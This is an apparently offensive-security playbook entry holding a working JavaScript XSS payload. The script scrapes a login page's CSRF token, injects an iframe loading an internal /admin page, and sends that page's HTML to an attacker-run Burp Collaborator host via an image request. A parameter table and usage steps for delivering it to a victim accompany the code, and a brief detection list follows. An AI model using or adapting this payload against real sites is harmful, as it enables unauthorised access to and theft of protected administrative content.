---
id: 428a1816-540c-4045-90ce-118db00fbeaf
type: code
language: javascript
verified: true
created_at: '2020-08-17T07:52:51.684815+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - XSS
  - exfiltration
  - CORS
platforms:
  - Web
validated: true
---

# JavaScript-Admin-Page-Source-Exfiltration

## Code

```javascript
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">' );
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
```

## Description

This JavaScript code exploits a confirmed XSS in the login form to inject an iframe loading an internal admin page. Upon loading, it captures the iframe's document body innerHTML and exfiltrates the encoded source code via an image src callback to the Collaborator URL, allowing the attacker to analyze protected page content.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ip | Internal IP address of the target endpoint | 192.168.0.50 |
| $collaboratorPayload | Unique subdomain for Burp Collaborator | abc123.oastify.com |

## Usage

After confirming XSS with a prior probe, deliver this script to the victim. It reuses the login injection vector to load /admin in an iframe and sends the page source. Decode the ?code= parameter in Collaborator to view the admin HTML, identifying features like user management options.

## Detection

- Logs of iframe loads to internal admin paths from login contexts.
- Outbound image requests with large encoded payloads from browser sessions.
- Anomalous access to admin endpoints without direct authentication.

## Related

- [[procedures/CORS-Misconfiguration-Leading-To-Internal-Network-Pivot]]
- [[tools/Burp-Suite]]
